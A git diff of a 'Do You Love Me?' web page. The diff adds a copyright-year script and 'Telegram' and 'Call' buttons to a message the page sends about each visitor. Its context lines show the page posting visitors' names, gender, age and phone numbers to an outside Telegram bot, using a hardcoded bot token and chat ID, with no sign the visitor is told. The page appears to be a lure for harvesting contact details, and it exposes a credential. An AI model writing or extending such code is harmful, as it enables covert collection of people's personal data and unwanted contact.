@@ -24,7 +24,7 @@
       </div>
     </div>
     <footer>
-      <p>&copy; 2023 Do You Love Me? All rights reserved.</p>
+      <p id="copyright"></p>
       <a href="privacy.html">Privacy Policy</a> |
       <a href="terms.html">Terms & Conditions</a>
     </footer>
@@ -48,7 +48,7 @@
         const telegramBotToken =
           "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
         const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
-        const message = `Informations:\nName: ${userData.username}\nGender: ${userData.gender}\nAge: ${userData.age}\nPhone: ${formattedPhone}`;
+        const message = `Informations: User \nName: ${userData.username}\nGender: ${userData.gender}\nAge: ${userData.age}\nPhone: ${formattedPhone}`;
 
         fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
           method: "POST",
@@ -62,8 +62,12 @@
               inline_keyboard: [
                 [
                   {
-                    text: "❤️ Love ❤️", // Clicking this button opens Telegram with the formatted phone number
+                    text: "Telegram📥", // Clicking this button opens Telegram with the formatted phone number
                     url: `https://t.me/${formattedPhone}`,
+                  },
+                 {
+                     text: "Call 📞", // Clicking this button initiates a phone call
+                     url: `tel:${formattedPhone}`,
                   },
                 ],
               ],
@@ -93,6 +97,12 @@
         } else {
           console.error("Message element not found!");
         }
+      }
+       // Automatically update the copyright year
+      const currentYear = new Date().getFullYear();
+      const copyrightElement = document.getElementById("copyright");
+      if (copyrightElement) {
+        copyrightElement.textContent = `© ${currentYear} Do You Love Me? All rights reserved.`;
       }
     </script>
   </body>
